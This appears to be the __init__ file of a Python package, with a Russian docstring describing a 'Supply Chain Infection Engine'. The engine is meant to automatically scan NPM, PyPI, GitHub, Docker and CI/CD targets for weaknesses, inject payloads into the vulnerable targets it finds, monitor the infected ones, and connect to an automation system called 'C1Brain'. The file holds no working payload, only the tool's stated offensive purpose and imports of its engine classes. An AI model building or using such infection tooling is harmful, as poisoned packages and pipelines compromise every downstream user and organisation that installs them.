"""
Supply Chain Infection Engine - модуль для автоматизации поиска и эксплуатации 
уязвимостей в цепочках поставок программного обеспечения.

Основные компоненты:
- Сканеры уязвимостей для различных платформ (NPM, PyPI, GitHub, Docker, CI/CD)
- Инжекторы payload для внедрения кода в найденные уязвимые цели
- Мониторинг инфицированных целей
- Интеграция с C1Brain для автоматизации процесса
"""

from src.supply_chain.engine import (
    SupplyChainEngine,
    SupplyChainTarget,
    Payload,
    TargetType,
    InfectionStatus,
) 